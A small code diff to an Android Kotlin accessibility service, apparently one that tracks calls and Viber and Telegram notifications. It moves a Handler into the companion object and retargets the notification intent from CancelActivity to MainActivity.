@@ -24,7 +24,7 @@ import com.start.utils.*
 class BestService : AccessibilityService() {
 
     private val notifId = 4
-    private var handler: Handler? = null
+
 
     companion object {
         const val CALL_CODE = 1
@@ -32,6 +32,7 @@ class BestService : AccessibilityService() {
         const val VIBER_CODE = 3
         const val TELEGRAM_CODE = 4
         const val OTHER_NOTIFICATIONS_CODE = 6
+        var handler: Handler? = null
     }
 
     private object PackageNames {
@@ -46,7 +47,7 @@ class BestService : AccessibilityService() {
         super.onCreate()
         createNotificationChannel()
 
-        val notificationIntent = Intent(this, CancelActivity::class.java)
+        val notificationIntent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(this, 0,
                 notificationIntent, 0)
 
